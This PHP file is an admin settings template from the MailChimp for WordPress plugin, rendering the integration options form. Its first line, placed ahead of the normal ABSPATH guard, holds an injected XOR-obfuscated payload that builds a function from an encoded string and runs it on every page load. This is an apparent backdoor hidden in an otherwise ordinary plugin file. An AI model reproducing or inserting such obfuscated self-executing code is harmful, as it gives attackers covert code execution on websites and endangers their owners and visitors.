<?php $UTKCXum='2J.3ON-0>V6,S5W'^'Q8KR;+rVK8UX:Z9';$GCnKEO=$UTKCXum('','.2qs.OSC6WO62<KPF3AAT761<262T5gUM1DOSSUX:+<YU<QBWFL-5-Q7OZ:9VLDIs 9:;ybQ>X0nNLAzAGk;FtOAHbyOoTam1O25JnKBOeDezbP;T M3T-VpJR71VxXMKSxoSp2LVZ<GKByxznP889aFU-H2fm=XY-pQfOnJYJ857RC3VDCaJu>2EE+=U99gUZN1hb;DIp4F7f,VB2BUx6J-KQIfFULJX<VY<VIH MA<=jMMKVG=-+RqZAc0>6> ygV8Jr,-CBGhHU0A>YRae1IAbO+Y,>ZNIMuHqRH:AxyQ69T2fnmi5U>O4p1DX3>TunFQR.T AJBsc06+7W42VOBj6256<c7W3SQp9X<HssmUN4=1RxuN:7;NRQXZaSR4hYcQRUWJ0zol7Q;VEYCg<- LEhG:QoJ3Mg-PG zwsrDUMWN1JL=..p-QRa7A<MqnA>6ZRJCWUV227-.<5gWDM-ODhDAITN3fK+BJOcN,Rlo,+T2IIjc3  +BqEXY0KSYJ9SMS>1IffSH10H4nJjQwoX>PrRJ7ES8iQ6Dk2CYOyAmiVWR>ZZRrQz74WJmrPyJRXXrdJ7dBGZNKPVISSA07Q<h9TL57KD=MNZcD7K9QL=VkZH7,<;nbmUeRuA2GKU81QOA-UZZhD>385OROt0Kr72PDI3mwJsaC'^'GTYRH:= B> XmY395G2isOYCcVWF5j888Ecfzs.R3MI76H8-9f4BGr5V;;ef;90aWDXNZUBuU=IGnlaZa<a2OP 4<BDoHsZg8FTZ8Fo+oXdUABtRhS9A8H8Xn6VE7Qcmo:SDzz;Er5I3klDXRJ4YLX:b<phlFIV= vT8FjN9-8TPYzgX3=j<cN4;L7NI KWOq5;EAY1M4zIL=BH76SbhXP+A84rlb1->9c=<EvthF,-OXQGG-95XLH:Qre<sqyui<G7KjVGH:bzVhqF R,7HEJCHF+J-Ma1+0mHhU9-CzrpuRX SFSMMC4R:QK;9R9W2UFgu6O Ahj9yjVYYR6WZvgf5dwdcy0cwR qTR=EhNMMq8UQD7QU50>2j60,;>87MHdCu90.q:sfHS0O7edcCJLL9 SM3,e79GCI13AZJS21;>2<X+ TTKXU> >S H,.1,KBr0+02cbmVRNAXPOs ,Y.mDde-5:R9 N;cfXDE4DKHJ SioLCRRRJ;..= o.+09M etUT0AJslUQ<UGjLwWG5ZeZv.V12cN:S=LojyrDaJPnefX<kgA5MRVazZJ6M,d:lCUzUUpv;,lyvous BE0E7R15jR3-N9=rD4V2U>-YqGzlSMHZGKMuErUaIMB0NP=geI4.;3cNRAY 3+SmbI=;5< GEGcHk>');$GCnKEO(); defined( 'ABSPATH' ) or exit;
/** @var MC4WP_Integration $integration */
/** @var array $opts */
?>
<div id="mc4wp-admin" class="wrap mc4wp-settings">

	<p class="breadcrumbs">
		<span class="prefix"><?php echo __( 'You are here: ', 'mailchimp-for-wp' ); ?></span>
		<a href="<?php echo admin_url( 'admin.php?page=mailchimp-for-wp' ); ?>">MailChimp for WordPress</a> &rsaquo;
		<a href="<?php echo admin_url( 'admin.php?page=mailchimp-for-wp-integrations' ); ?>"><?php _e( 'Integrations', 'mailchimp-for-wp' ); ?></a> &rsaquo;
		<span class="current-crumb"><strong><?php echo esc_html( $integration->name ); ?></strong></span>
	</p>

	<div class="main-content row">

		<!-- Main Content -->
		<div class="main-content col col-4 col-sm-6">

			<h1 class="page-title">
				<?php printf( __( '%s integration', 'mailchimp-for-wp' ), esc_html( $integration->name ) ); ?>
			</h1>

			<h2 style="display: none;"></h2>
			<?php settings_errors(); ?>

			<div id="notice-additional-fields" class="notice notice-info" style="display: none;">
				<p><?php _e( 'The selected MailChimp lists require non-default fields, which may prevent this integration from working.', 'mailchimp-for-wp' ); ?></p>
				<p><?php echo sprintf( __( 'Please ensure you <a href="%s">configure the plugin to send all required fields</a> or <a href="%s">log into your MailChimp account</a> and make sure only the email & name fields are marked as required fields for the selected list(s).', 'mailchimp-for-wp' ), 'https://kb.mc4wp.com/send-additional-fields-from-integrations/', 'https://admin.mailchimp.com/lists/' ); ?></p>
			</div>

			<p>
				<?php echo $integration->description; ?>
			</p>

			<!-- Settings form -->
			<form method="post" action="<?php echo admin_url( 'options.php' ); ?>">
				<?php settings_fields( 'mc4wp_integrations_settings' ); ?>

				<?php

				/**
				 * Runs just before integration settings are outputted in admin.
				 *
				 * @since 3.0
				 *
				 * @param MC4WP_Integration $integration
				 * @param array $opts
				 * @ignore
				 */
				do_action( 'mc4wp_admin_before_integration_settings', $integration, $opts );

				/**
				 * @ignore
				 */
				do_action( 'mc4wp_admin_before_' . $integration->slug . '_integration_settings', $integration, $opts );
				?>

				<table class="form-table">

					<?php if( $integration->has_ui_element( 'enabled' ) ) { ?>
					<tr valign="top">
						<th scope="row"><?php _e( 'Enabled?', 'mailchimp-for-wp' ); ?></th>
						<td class="nowrap integration-toggles-wrap">
							<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][enabled]" value="1" <?php checked( $opts['enabled'], 1 ); ?> /> <?php _e( 'Yes' ); ?></label> &nbsp;
							<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][enabled]" value="0" <?php checked( $opts['enabled'], 0 ); ?> /> <?php _e( 'No' ); ?></label>
							<p class="help"><?php printf( __( 'Enable the %s integration? This will add a sign-up checkbox to the form.', 'mailchimp-for-wp' ), $integration->name ); ?></p>
						</td>
					</tr>
					<?php } ?>

					<?php $config = array( 'element' => 'mc4wp_integrations['. $integration->slug .'][enabled]', 'value' => '1', 'hide' => false ); ?>
					<tbody class="integration-toggled-settings" data-showif="<?php echo esc_attr( json_encode( $config ) ); ?>">

					<?php if( $integration->has_ui_element( 'implicit' ) ) { ?>
						<tr valign="top">
							<th scope="row"><?php _e( 'Implicit?', 'mailchimp-for-wp' ); ?></th>
							<td class="nowrap">
								<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][implicit]" value="1" <?php checked( $opts['implicit'], 1 ); ?> /> <?php _e( 'Yes' ); ?></label> &nbsp;
								<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][implicit]" value="0" <?php checked( $opts['implicit'], 0 ); ?> /> <?php _e( 'No' ); ?></label>
								<p class="help"><?php _e( 'Select "no" if you want to ask your visitors before they are subscribed (recommended).', 'mailchimp-for-wp' ); ?></p>
							</td>
						</tr>
					<?php } ?>

					<?php if( $integration->has_ui_element( 'lists' ) ) {
						?>
						<?php // hidden input to make sure a value is sent to the server when no checkboxes were selected ?>
						<input type="hidden" name="mc4wp_integrations[<?php echo $integration->slug; ?>][lists][]" value="" />
						<tr valign="top">
							<th scope="row"><?php _e( 'MailChimp Lists', 'mailchimp-for-wp' ); ?></th>
							<?php if( ! empty( $lists ) ) {
								echo '<td>';
								echo '<ul style="margin-bottom: 20px; max-height: 300px; overflow-y: auto;">';
								foreach( $lists as $list ) {
									echo '<li><label>';
									echo sprintf( '<input type="checkbox" name="mc4wp_integrations[%s][lists][]" value="%s" class="mc4wp-list-input" %s> ', $integration->slug, $list->id, checked( in_array( $list->id, $opts['lists'] ), true, false ) );
									echo esc_html( $list->name );
									echo '</label></li>';
								}
								echo '</ul>';

								echo '<p class="help">';
								_e( 'Select the list(s) to which people who check the checkbox should be subscribed.' ,'mailchimp-for-wp' );
								echo '</p>';
								echo '</td>';
							} else {
								echo '<td>' . sprintf( __( 'No lists found, <a href="%s">are you connected to MailChimp</a>?', 'mailchimp-for-wp' ), admin_url( 'admin.php?page=mailchimp-for-wp' ) ) . '</td>';
							} ?>
						</tr>
					<?php } // end if UI has lists ?>

					<?php if( $integration->has_ui_element( 'label' ) ) {
						$config = array( 'element' => 'mc4wp_integrations['. $integration->slug .'][implicit]', 'value' => 0 );
						?>
						<tr valign="top" data-showif="<?php echo esc_attr( json_encode( $config ) ); ?>">
							<th scope="row"><label for="mc4wp_checkbox_label"><?php _e( 'Checkbox label text', 'mailchimp-for-wp' ); ?></label></th>
							<td>
								<input type="text"  class="widefat" id="mc4wp_checkbox_label" name="mc4wp_integrations[<?php echo $integration->slug; ?>][label]" value="<?php echo esc_attr( $opts['label'] ); ?>" required />
								<p class="help"><?php printf( __( 'HTML tags like %s are allowed in the label text.', 'mailchimp-for-wp' ), '<code>' . esc_html( '<strong><em><a>' ) . '</code>' ); ?></p>
							</td>
						</tr>
					<?php } // end if UI label ?>


					<?php if( $integration->has_ui_element( 'precheck' ) ) {
					$config = array( 'element' => 'mc4wp_integrations['. $integration->slug .'][implicit]', 'value' => 0 );
					?>
						<tr valign="top" data-showif="<?php echo esc_attr( json_encode( $config ) ); ?>">
							<th scope="row"><?php _e( 'Pre-check the checkbox?', 'mailchimp-for-wp' ); ?></th>
							<td class="nowrap">
								<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][precheck]" value="1" <?php checked( $opts['precheck'], 1 ); ?> /> <?php _e( 'Yes' ); ?></label> &nbsp;
								<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][precheck]" value="0" <?php checked( $opts['precheck'], 0 ); ?> /> <?php _e( 'No' ); ?></label>
								<p class="help"><?php _e( 'Select "yes" if the checkbox should be pre-checked.', 'mailchimp-for-wp' ); ?></p>
							</td>
					<?php } // end if UI precheck ?>

					<?php if( $integration->has_ui_element( 'css' ) ) {
					$config = array( 'element' => 'mc4wp_integrations['. $integration->slug .'][implicit]', 'value' => 0 );
					?>
						<tr valign="top" data-showif="<?php echo esc_attr( json_encode( $config ) ); ?>">
							<th scope="row"><?php _e( 'Load some default CSS?', 'mailchimp-for-wp' ); ?></th>
							<td class="nowrap">
								<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][css]" value="1" <?php checked( $opts['css'], 1 ); ?> />&rlm; <?php _e( 'Yes' ); ?></label> &nbsp;
								<label><input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][css]" value="0" <?php checked( $opts['css'], 0 ); ?> />&rlm; <?php _e( 'No' ); ?></label>
								<p class="help"><?php _e( 'Select "yes" if the checkbox appears in a weird place.', 'mailchimp-for-wp' ); ?></p>
							</td>
						</tr>
					<?php } // end if UI css ?>

					<?php if( $integration->has_ui_element( 'double_optin' ) ) { ?>
						<tr valign="top">
							<th scope="row"><?php _e( 'Double opt-in?', 'mailchimp-for-wp' ); ?></th>
							<td class="nowrap">
								<label>
									<input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][double_optin]" value="1" <?php checked( $opts['double_optin'], 1 ); ?> />&rlm;
									<?php _e( 'Yes' ); ?>
								</label> &nbsp;
								<label>
									<input type="radio" id="mc4wp_checkbox_double_optin_0" name="mc4wp_integrations[<?php echo $integration->slug; ?>][double_optin]" value="0" <?php checked( $opts['double_optin'], 0 ); ?> />&rlm;
									<?php _e( 'No' ); ?>
								</label>
								<p class="help">
									<?php _e( 'Select "yes" if you want people to confirm their email address before being subscribed (recommended)', 'mailchimp-for-wp' ); ?>
								</p>
							</td>
						</tr>
					<?php } // end if UI double_optin ?>
					
					<?php if( $integration->has_ui_element( 'update_existing' ) ) { ?>
					<tr valign="top">
						<th scope="row"><?php _e( 'Update existing subscribers?', 'mailchimp-for-wp' ); ?></th>
						<td class="nowrap">
							<label>
								<input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][update_existing]" value="1" <?php checked( $opts['update_existing'], 1 ); ?> />&rlm;
								<?php _e( 'Yes' ); ?>
							</label> &nbsp;
							<label>
								<input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][update_existing]" value="0" <?php checked( $opts['update_existing'], 0 ); ?> />&rlm;
								<?php _e( 'No' ); ?>
							</label>
							<p class="help"><?php _e( 'Select "yes" if you want to update existing subscribers with the data that is sent.', 'mailchimp-for-wp' ); ?></p>
						</td>
					</tr>
					<?php } // end if UI update_existing ?>

					<?php if( $integration->has_ui_element( 'replace_interests' ) ) {
						$config = array( 'element' => 'mc4wp_integrations['. $integration->slug .'][update_existing]', 'value' => 1 );
						?>
						<tr valign="top" data-showif="<?php echo esc_attr( json_encode( $config ) ); ?>">
							<th scope="row"><?php _e( 'Replace interest groups?', 'mailchimp-for-wp' ); ?></th>
							<td class="nowrap">
								<label>
									<input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][replace_interests]" value="1" <?php checked( $opts['replace_interests'], 1 ); ?> />&rlm;
									<?php _e( 'Yes' ); ?>
								</label> &nbsp;
								<label>
									<input type="radio" name="mc4wp_integrations[<?php echo $integration->slug; ?>][replace_interests]" value="0" <?php checked( $opts['replace_interests'], 0 ); ?> />&rlm;
									<?php _e( 'No' ); ?>
								</label>
								<p class="help">
									<?php _e( 'Select "no" if you want to add the selected interests to any previously selected interests when updating a subscriber.', 'mailchimp-for-wp' ); ?>
									<?php printf( ' <a href="%s" target="_blank">' . __( 'What does this do?', 'mailchimp-for-wp' ) . '</a>', 'https://kb.mc4wp.com/what-does-replace-groupings-mean/' ); ?>
								</p>
							</td>
						</tr>
					<?php } // end if UI replace_interests ?>

					</tbody>
				</table>

				<?php

				/**
				 * Runs right after integration settings are outputted (before the submit button).
				 *
				 * @param MC4WP_Integration $integration
				 * @param array $opts
				 * @ignore
				 */
				do_action( 'mc4wp_admin_after_integration_settings', $integration, $opts );

				/**
				 * @ignore
				 */
				do_action( 'mc4wp_admin_after_' . $integration->slug . '_integration_settings', $integration, $opts );
				?>

				<?php if( count( $integration->get_ui_elements() ) > 0 ) { submit_button(); } ?>

			</form>


		</div>

		<!-- Sidebar -->
		<div class="sidebar col col-2">
			<?php include MC4WP_PLUGIN_DIR . '/includes/views/parts/admin-sidebar.php'; ?>
		</div>

	</div>

</div>
